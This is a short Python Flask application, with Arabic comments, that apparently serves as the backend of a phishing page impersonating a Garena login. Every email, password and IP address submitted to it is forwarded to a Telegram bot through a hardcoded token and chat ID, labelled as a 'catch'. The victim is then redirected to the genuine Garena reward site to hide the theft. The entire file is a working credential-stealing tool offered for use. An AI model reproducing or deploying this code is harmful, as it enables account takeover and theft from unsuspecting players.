from flask import Flask, render_template, request, redirect
import requests
import datetime

app = Flask(__name__)

# ---------------- إعدادات تيليجرام ----------------
# ضع التوكن والايدي الخاص بك هنا
TELEGRAM_TOKEN = "8629856601:AAGp5i4FH27hJ24bhr7RsSCIGi1TZvGi8no"
CHAT_ID = "8988121334"

def send_to_telegram(email, password, ip):
    time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"🚨 **صيد جديد (Garena)** 🚨\n📧 Email: `{email}`\n🔑 Password: `{password}`\n🌐 IP: `{ip}`\n⏰ Time: {time_now}"
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload)
    except:
        pass

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
        send_to_telegram(email, password, ip)
        return redirect("https://reward.ff.garena.com/")
    
    return render_template('login.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
